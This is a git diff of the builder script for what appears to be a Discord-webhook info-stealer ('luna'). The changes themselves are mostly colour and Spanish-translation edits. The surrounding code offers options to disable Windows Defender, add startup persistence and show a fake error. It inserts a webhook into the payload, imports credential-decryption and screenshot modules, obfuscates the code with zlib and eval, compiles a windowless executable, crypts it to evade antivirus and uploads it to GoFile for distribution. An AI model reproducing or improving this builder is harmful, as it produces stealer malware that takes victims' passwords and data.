@@ -102,30 +102,30 @@ class Builder:
             self.ping = False
             self.pingtype = "none"
 
-        self.error = input(f'{Fore.YELLOW}[{Fore.RESET}+{Fore.YELLOW}]{Fore.RESET} Añadir un erro falso? (y/n): ')
+        self.error = input(f'{Fore.YELLOW}[{Fore.RESET}+{Fore.YELLOW}]{Fore.RESET} Añadir un error falso? (y/n): ')
         if self.error.lower() == 'y':
             self.error = True
         else:
             self.error = False
 
-        self.startup = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Añadir payload al arrancar el sistema? (y/n): ')
+        self.startup = input(f'{Fore.YELLOW}[{Fore.RESET}+{Fore.YELLOW}]{Fore.RESET} Añadir payload al arrancar el sistema? (y/n): ')
         if self.startup.lower() == 'y':
             self.startup = True
         else:
             self.startup = False
 
-        self.defender = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Quieres desactivar Windows Defender? (y/n): ')
+        self.defender = input(f'{Fore.YELLOW}[{Fore.RESET}+{Fore.YELLOW}]{Fore.RESET} Quieres desactivar Windows Defender? (y/n): ')
         if self.defender.lower() == 'y':
             self.defender = True
         else:
             self.defender = False
 
-        self.obfuscation = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Deseas ofuscar el archivo? (y/n): ')
+        self.obfuscation = input(f'{Fore.YELLOW}[{Fore.RESET}+{Fore.YELLOW}]{Fore.RESET} Deseas ofuscar el archivo? (y/n): ')
 
-        self.compy = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Deseas compliar el .exe? (y/n): ')
+        self.compy = input(f'{Fore.YELLOW}[{Fore.RESET}+{Fore.YELLOW}]{Fore.RESET} Deseas compliar el .exe? (y/n): ')
 
         if self.compy == 'y':
-            self.icon = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Quieres añadir un icono al .exe (y/n): ')
+            self.icon = input(f'{Fore.YELLOW}[{Fore.RESET}+{Fore.YELLOW}]{Fore.RESET} Quieres añadir un icono al .exe (y/n): ')
             if self.icon == 'y':
                 self.icon_exe()
             else:
@@ -135,7 +135,7 @@ class Builder:
 
         self.mk_file(self.filename, self.webhook)
 
-        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Archivo creado satisfactoriamente!{Fore.RESET}')
+        print(f'{Fore.YELLOW}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.YELLOW}]{Fore.RESET}{Fore.WHITE} Archivo creado satisfactoriamente!{Fore.RESET}')
 
         self.cleanup(self.filename)
         self.renamefile(self.filename)
@@ -146,11 +146,11 @@ class Builder:
             pass
             
         run = input(
-            f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Deseas testear el archivo? [y/n]: ')
+            f'{Fore.YELLOW}[{Fore.RESET}+{Fore.YELLOW}]{Fore.RESET} Deseas testear el archivo? [y/n]: ')
         if run.lower() == 'y':
             self.run(self.filename)
 
-        input(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Aprienta enter para salir...{Fore.RESET}')
+        input(f'{Fore.YELLOW}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.YELLOW}]{Fore.RESET}{Fore.WHITE} Aprienta enter para salir...{Fore.RESET}')
         sys.exit()
 
     def loading(self):
@@ -233,7 +233,7 @@ class Builder:
 
         for file in required_files:
             if not os.path.isfile(file):
-                print(f'{Fore.RED}[{Fore.RESET}{Fore.WHITE}!{Fore.RESET}{Fore.RED}] {file} not found!')
+                print(f'{Fore.RED}[{Fore.RESET}{Fore.WHITE}!{Fore.RESET}{Fore.RED}] {file} no encontrado!')
                 return False
 
         try:
@@ -256,20 +256,20 @@ class Builder:
 
         return True
 
-    def icon_exe(self):
-        self.icon_name = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Enter the name of the icon: ')
-
-        if os.path.isfile(f"./{self.icon_name}"):
-            pass
-        else:
-            print(f'{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}Icon not found! Please check the name and make sure it\'s in the current directory.')
-            input(f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Press anything to exit...")
-
-        if self.icon_name.endswith('.ico'):
-            pass
-        else:
-            print(f'{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}Icon must have .ico extension! Please convert it and try again.')
-            input(f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Press anything to exit...")
+#    def icon_exe(self):
+#        self.icon_name = input(f'{Fore.YELLOW}[{Fore.RESET}+{Fore.YELLOW}]{Fore.RESET} Enter the name of the icon: ')
+#
+#        if os.path.isfile(f"./{self.icon_name}"):
+#            pass
+#        else:
+#            print(f'{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}Icon not found! Please check the name and make sure it\'s in the current directory.')
+#            input(f"{Fore.YELLOW}[{Fore.RESET}+{Fore.YELLOW}]{Fore.RESET} Press anything to exit...")
+#
+#        if self.icon_name.endswith('.ico'):
+#            pass
+#        else:
+#            print(f'{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}Icon must have .ico extension! Please convert it and try again.')
+#            input(f"{Fore.YELLOW}[{Fore.RESET}+{Fore.YELLOW}]{Fore.RESET} Press anything to exit...")
 
     def renamefile(self, filename):
         try:
@@ -290,7 +290,7 @@ class Builder:
             pass
 
     def mk_file(self, filename, webhook):
-        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET} {Fore.WHITE}Generating source code...{Fore.RESET}')
+        print(f'{Fore.YELLOW}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.YELLOW}]{Fore.RESET} {Fore.WHITE}Generando codigo fuente...{Fore.RESET}')
 
         with open('./luna.py', 'r', encoding="utf-8") as f:
             code = f.read()
@@ -304,12 +304,12 @@ class Builder:
                     .replace("\"%_defender_enabled%\"", str(self.defender)))
 
         time.sleep(2)
-        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Source code has been generated...{Fore.RESET}')
+        print(f'{Fore.YELLOW}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.YELLOW}]{Fore.RESET}{Fore.WHITE} Codigo fuente generado...{Fore.RESET}')
 
         with open(f"{filename}.py", mode='rb') as f:
             content = f.read()
 
-        print(f"{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Compressing Code...{Fore.RESET}")
+        print(f"{Fore.YELLOW}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.YELLOW}]{Fore.RESET}{Fore.WHITE} Comprimiendo codigo...{Fore.RESET}")
 
         original_size = len(content)
         content = self.compress(content)
@@ -320,7 +320,7 @@ class Builder:
             if self.obfuscation == 'n' and self.compy == 'y':
                 f.write("\nimport os, platform, re, threading, uuid, requests, wmi, subprocess, sqlite3, psutil, json, base64, ctypes;from shutil import copy2;from zipfile import ZipFile;from Crypto.Cipher import AES;from discord import Embed, File, SyncWebhook;from PIL import ImageGrab;from win32crypt import CryptUnprotectData")
 
-        print(f"{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Old file size: {original_size} bytes - New file size: {new_size} bytes {Fore.RESET}")
+        print(f"{Fore.YELLOW}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.YELLOW}]{Fore.RESET}{Fore.WHITE} Old file size: {original_size} bytes - New file size: {new_size} bytes {Fore.RESET}")
 
         if self.obfuscation == 'y' and self.compy == 'y':
             self.encryption(f"compressed_{filename}")
@@ -339,25 +339,25 @@ class Builder:
         return f"eval(compile(__import__('zlib').decompress({compressed_code}),filename='{self.random_string()}',mode='exec'))"
 
     def encryption(self, filename):
-        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Obfuscating code...{Fore.RESET}')
+        print(f'{Fore.YELLOW}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.YELLOW}]{Fore.RESET}{Fore.WHITE} Obfuscating code...{Fore.RESET}')
         os.system(f"python obfuscation.py {filename}.py")
 
     def compile(self, filename):
-        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET} {Fore.WHITE}Compiling code...{Fore.RESET}')
+        print(f'{Fore.YELLOW}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.YELLOW}]{Fore.RESET} {Fore.WHITE}Compiling code...{Fore.RESET}')
         if self.icon == 'y':
             icon = "./" + self.icon_name
         else:
             icon = "NONE"
         os.system(f'python -m PyInstaller --hidden-import wmi --hidden-import pycryptodome --onefile --noconsole --upx-dir=./tools -i {icon} --distpath ./ .\\{filename}.py')
-        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Code compiled!{Fore.RESET}')
+        print(f'{Fore.YELLOW}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.YELLOW}]{Fore.RESET}{Fore.WHITE} Code compiled!{Fore.RESET}')
 
     def exe_crypt(self, filename):
-        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Encrypting executable...{Fore.RESET}')
+        print(f'{Fore.YELLOW}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.YELLOW}]{Fore.RESET}{Fore.WHITE} Encrypting executable...{Fore.RESET}')
         subprocess.run(["./tools/Blankrypt.exe", f"{filename}.exe"], capture_output=True, check=True)
-        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Executable encrypted!{Fore.RESET}')
+        print(f'{Fore.YELLOW}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.YELLOW}]{Fore.RESET}{Fore.WHITE} Executable encrypted!{Fore.RESET}')
 
     def run(self, filename):
-        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Attempting to execute file...')
+        print(f'{Fore.YELLOW}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.YELLOW}]{Fore.RESET}{Fore.WHITE} Attempting to execute file...')
 
         if os.path.isfile(f'./{filename}.exe'):
             os.system(f'start ./{filename}.exe')
@@ -398,7 +398,7 @@ class Builder:
         gofile = requests.post(
             f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(f"{filename}.exe", 'rb')}).json()['data']['downloadPage']
         
-        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} GoFile link: {gofile}{Fore.RESET}')
+        print(f'{Fore.YELLOW}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.YELLOW}]{Fore.RESET}{Fore.WHITE} GoFile link: {gofile}{Fore.RESET}')
 
 if __name__ == '__main__':
     init()
